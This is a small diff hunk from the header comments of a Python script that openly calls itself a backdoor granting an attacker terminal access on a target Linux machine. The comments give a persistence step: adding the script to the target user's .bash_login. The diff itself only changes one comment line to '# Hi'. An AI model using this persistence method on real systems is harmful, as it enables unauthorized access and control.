@@ -4,7 +4,7 @@
 # This is a Python program that is meant to run as a process on a target machine
 # It grants an attacking user a backdoor, providing an attacker with access to 
 # some terminal commands
-#
+# Hi
 # To install this script to a linux user's profile, add '/path/to/backdoor.py'
 # to the .bash_login file in the target user's home folder. If the file does not 
 # exist, you can create it.
